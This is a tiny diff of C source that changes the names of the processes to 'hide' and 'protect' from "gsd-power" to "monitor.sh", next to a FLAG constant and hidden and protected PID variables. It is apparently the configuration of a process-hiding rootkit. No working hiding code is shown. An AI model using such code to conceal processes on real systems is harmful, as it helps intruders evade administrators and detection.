@@ -17,8 +17,8 @@
 
 
 #define FLAG 0x80000000
-const char *protected = "gsd-power";
-const char *hide = "gsd-power";
+const char *protected = "monitor.sh";
+const char *hide = "monitor.sh";
 int hidden_pid=-1;
 int protected_pid=-1;
 
